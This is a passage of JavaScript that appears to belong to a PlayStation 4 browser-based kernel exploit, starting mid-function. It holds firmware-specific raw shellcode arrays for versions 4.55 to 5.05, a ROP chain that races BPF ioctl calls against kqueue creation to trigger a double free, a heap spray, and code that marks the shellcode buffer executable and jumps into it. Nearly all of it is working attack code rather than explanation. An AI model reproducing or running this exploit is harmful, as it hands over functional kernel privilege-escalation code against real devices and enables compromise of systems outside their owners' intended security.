		krop.push(window.gadgets["ret2userland"]);
		krop.push(kscratch.add32(0x1000));
		
		// END OF KROP
		
		var kq = p.malloc32(0x10);
		var kev = p.malloc32(0x100);
		kev.backing[0] = sock;
		kev.backing[2] = 0x1ffff;
		kev.backing[3] = 1;
		kev.backing[4] = 5;
		
		// Shellcode to clean up memory
		if (fwFromUA == "5.01") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xDF8024B4, 0x8D4D0010, 0x5AB024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
		} else if (fwFromUA == "5.05") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xE09024B4, 0x8D4D0010, 0x5E8024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
		} else if (fwFromUA == "4.74") {
			var shcode = [0x00008be9, 0x90909000, 0x90909090, 0x90909090, 0x0082b955, 0x8948c000, 0x415641e5, 0x53544155, 0x8949320f, 0xbbc089d4, 0x00000100, 0x20e4c149, 0x48c40949, 0x0096058d, 0x8d490000, 0x48302494, 0x8d4dffcf, 0xcdf024b4, 0x8d4d000e, 0xc76024ac, 0x8149ffd0, 0x660570c4, 0x10894801, 0x00401f0f, 0x000002ba, 0xe6894c00, 0x000800bf, 0xd6ff4100, 0x393d8d48, 0x48000000, 0xc031c689, 0x83d5ff41, 0xdc7501eb, 0x41c0315b, 0x415d415c, 0x90c35d5e, 0x3d8d4855, 0xffffff78, 0x8948f631, 0x00e95de5, 0x48000000, 0x000bc0c7, 0x89490000, 0xc3050fca, 0x6c616d6b, 0x3a636f6c, 0x25783020, 0x6c363130, 0x00000a58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
		} else if (fwFromUA == "4.55") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x6A302494, 0x8D4DFFCF, 0xE18024B4, 0x8D4D000E, 0xE96024AC, 0x8149FFD0, 0x65A680C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
		}
		
		var shellbuf = p.malloc32(0x1000);
		for (var i = 0; i < shcode.length; i++)
			shellbuf.backing[i] = shcode[i];
		
		// RACE!
		var race = new rop();
		start1();
		while (1) {
			race.count = 0;
			
			// Create a kqueue
			race.push(window.syscalls[362]);
			race.push(window.gadgets["pop rdi"]);
			race.push(kq);
			race.push(window.gadgets["mov [rdi], rax"]);
			
			// Race against the other thread
			race.push(window.gadgets["ret"]);
			race.push(window.gadgets["ret"]);
			race.push(window.gadgets["ret"]);
			race.push(window.gadgets["ret"]);
			race.push_write8(loop1, interrupt1);
			race.push(window.gadgets["pop rdi"]);
			race.push(fd);
			race.push(window.gadgets["pop rsi"]);
			race.push(0x8010427B);
			race.push(window.gadgets["pop rdx"]);
			race.push(bpf_valid_prog);
			race.push(window.syscalls[54]);
			
			// Attempt to trigger double free()
			race.push(window.gadgets["pop rax"]);
			race.push(kq);
			race.push(window.gadgets["mov rax, [rax]"]);
			race.push(window.gadgets["pop rdi"]);
			race.push(0);
			race.push(window.gadgets["add rdi, rax"]);
			race.push(window.gadgets["pop rsi"]);
			race.push(kev);
			race.push(window.gadgets["pop rdx"]);
			race.push(1);
			race.push(window.gadgets["pop rcx"]);
			race.push(0);
			race.push(window.gadgets["pop r8"]);
			race.push(0);
			race.push(window.syscalls[363]);
			
			// Spray via ioctl
			race.push(window.gadgets["pop rdi"]);
			race.push(fd1);
			race.push(window.gadgets["pop rsi"]);
			race.push(0x8010427B);
			race.push(window.gadgets["pop rdx"]);
			race.push(bpf_spray_prog);
			race.push(window.syscalls[54]);
			
			// Close the poisoned kqueue and run the kROP chain!
			race.push(window.gadgets["pop rax"]);
			race.push(kq);
			race.push(window.gadgets["mov rax, [rax]"]);
			race.push(window.gadgets["pop rdi"]);
			race.push(0);
			race.push(window.gadgets["add rdi, rax"]);
			race.push(window.syscalls[6]);
			
			// alert("Gotta go fast!"); // for kexploit debugging
			race.run();
			
			if (kscratch.backing[0] != 0) {
				// Clean up memory
				p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
				p.fcall(shellbuf);
				
				return true;
			}
		}
	} catch(ex) {
		fail(ex)
	}
	
	// failed (should never go here)
	return false;
}